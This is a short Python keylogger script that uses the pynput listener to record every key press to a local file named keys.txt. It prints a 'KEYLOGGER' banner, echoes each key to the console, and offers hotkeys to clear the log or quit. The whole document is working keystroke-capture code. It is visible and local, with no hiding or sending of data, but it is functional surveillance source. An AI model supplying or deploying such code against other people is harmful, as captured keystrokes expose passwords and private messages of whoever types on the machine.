import pynput

from pynput.keyboard import Key, Listener

print("""***************** KEYLOGGER *****************

quit = esc
Delete File = page_down""")

count = 0
keylist = []

def on_press(key):
    if key == Key.page_down:
        print("file is cleaning...")
        open("keys.txt", "w").close()
        print("file cleaned.")

        return False

    else:
        global count, keylist
        count += 1
        print(f"{key} pressed")
        keylist.append(key)

        if count >= 1:
            count = 0
            write_keys(keylist)
            keylist = []


def write_keys(keylist):
    with open("keys.txt", "a", encoding="utf-8") as file:
        for i in keylist:
            file.write(str(i) + "\n")

def on_release(key):
    if key == Key.esc:
        print("You're quitting...")
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
